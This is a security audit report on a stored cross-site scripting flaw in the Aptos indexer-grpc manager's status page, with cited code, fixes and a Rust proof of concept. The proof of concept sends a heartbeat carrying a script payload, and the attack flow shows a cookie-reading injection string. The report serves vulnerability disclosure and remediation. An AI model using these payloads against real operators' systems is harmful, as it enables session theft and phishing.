# Audit Report

## Title
Cross-Site Scripting (XSS) via Unsanitized External Data in Indexer-gRPC Status Pages

## Summary
The indexer-grpc status page implementations render externally-controlled data from protobuf messages without HTML sanitization, allowing attackers to inject arbitrary JavaScript that executes when operators or users view the status page.

## Finding Description

The `GenericConfig::status_page()` method delegates to `RunnableConfig` implementations without performing any output sanitization. [1](#0-0) 

Concrete implementations like `IndexerGrpcManagerConfig::status_page()` call rendering functions that display external data. [2](#0-1) 

The status page rendering uses the `build_html` crate's `with_raw()` method to insert content, which does not perform HTML entity encoding. External data including service addresses and stream IDs are inserted directly into HTML tables without sanitization. [3](#0-2) 

The attack vector is the unauthenticated gRPC `Heartbeat` RPC endpoint, which accepts a `ServiceInfo` message containing an arbitrary `address` string field. [4](#0-3) 

This address is extracted and stored in the metadata manager's internal state without validation. [5](#0-4) 

Similarly, the `ActiveStream.id` field from data services can contain malicious payloads. [6](#0-5) 

The status endpoint is publicly accessible without authentication on the health check port. [7](#0-6) 

**Attack Flow:**
1. Attacker deploys a malicious fullnode or data service
2. Sends `HeartbeatRequest` with `ServiceInfo.address = "<script>alert(document.cookie)</script>"`
3. The gRPC manager stores this address without validation
4. When an operator views the status page at `http://<manager-host>:<health_port>/`, the malicious script executes in their browser
5. Attacker can steal session cookies, perform CSRF attacks, or redirect to phishing pages

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under the Aptos bug bounty program. While it does not directly compromise consensus, validator operations, or on-chain funds, it enables:

- **Session hijacking**: Stealing authentication tokens from operators monitoring the indexer infrastructure
- **Phishing attacks**: Redirecting operators to credential-harvesting pages
- **Information disclosure**: Accessing browser-stored sensitive data
- **Lateral movement**: Potential pivot point if operators' browsers have access to internal systems

The impact is limited to operators/users who view the status page, not the blockchain network itself, which places it in the Medium category rather than High/Critical.

## Likelihood Explanation

**High likelihood:**
- No authentication required to send heartbeat messages
- No input validation on the `address` or `id` fields
- Status pages are commonly monitored by operations teams
- Simple to exploit with a single gRPC request
- No security headers (CSP, X-Frame-Options) provide defense-in-depth

The only barrier is network access to the gRPC manager port, which is typically exposed for fullnodes and data services to connect.

## Recommendation

Implement HTML entity encoding for all external data before rendering:

```rust
// Add HTML escaping utility
fn escape_html(input: &str) -> String {
    input
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

// In status_page.rs, escape before with_raw():
.with_cell(
    TableCell::new(TableCellType::Data)
        .with_raw(escape_html(&fullnode_info.0))
)
```

Alternatively, use `build_html`'s safe methods that perform automatic escaping, or migrate to a template engine with auto-escaping (e.g., `askama`).

Additionally:
1. Add Content-Security-Policy headers to the status page responses
2. Validate/sanitize the `address` field in heartbeat messages (enforce hostname format)
3. Consider adding authentication to the heartbeat endpoint
4. Add rate limiting to prevent heartbeat spam attacks

## Proof of Concept

```rust
// Run this against a local indexer-grpc-manager instance

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    FullnodeInfo, HeartbeatRequest, ServiceInfo,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to gRPC manager
    let mut client = GrpcManagerClient::connect("http://127.0.0.1:50051").await?;

    // Craft malicious heartbeat with XSS payload
    let malicious_address = r#"<script>alert('XSS from ' + document.domain)</script>"#.to_string();
    
    let request = Request::new(HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some(malicious_address),
            info: Some(Info::FullnodeInfo(FullnodeInfo {
                chain_id: 1,
                timestamp: None,
                known_latest_version: Some(12345),
            })),
        }),
    });

    // Send malicious heartbeat
    let response = client.heartbeat(request).await?;
    println!("Heartbeat accepted: {:?}", response);

    println!("Now visit http://127.0.0.1:<health_port>/ to trigger XSS");
    
    Ok(())
}
```

When viewing the status page after running this PoC, the JavaScript alert will execute, demonstrating arbitrary code execution in the operator's browser.

---

## Notes

This vulnerability exists because the framework design trusts `RunnableConfig` implementations to perform their own output sanitization, but the implementations fail to do so when rendering external data. The framework itself provides no sanitization layer at lines 105-107 as questioned, which is acceptable for trusted internal data but problematic when implementations render untrusted external inputs. The root cause is the combination of: (1) unauthenticated external data ingestion, (2) use of `with_raw()` for rendering, and (3) lack of input validation or output encoding.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L105-107)
```rust
    async fn status_page(&self) -> Result<warp::reply::Response, warp::Rejection> {
        self.server_config.status_page().await
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L219-222)
```rust
    let status_endpoint = warp::path::end().and_then(move || {
        let config = config.clone();
        async move { config.status_page().await }
    });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L64-66)
```rust
    async fn status_page(&self) -> Result<Response, Rejection> {
        crate::status_page::status_page().await
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L79-88)
```rust
                    table.with_custom_body_row(
                        TableRow::new()
                            .with_cell(
                                TableCell::new(TableCellType::Data).with_raw(fullnode_info.0),
                            )
                            .with_cell(TableCell::new(TableCellType::Data).with_raw(timestamp))
                            .with_cell(
                                TableCell::new(TableCellType::Data).with_raw(known_latest_version),
                            ),
                    )
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/status_page.rs (L307-312)
```rust
            stream.2.active_streams.iter().for_each(|active_stream| {
                table.add_custom_body_row(
                    TableRow::new()
                        .with_cell(TableCell::new(TableCellType::Data).with_raw(&active_stream.id))
                        .with_cell(TableCell::new(TableCellType::Data).with_raw(&timestamp))
                        .with_cell(TableCell::new(TableCellType::Data).with_raw(format!(
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-549)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
```
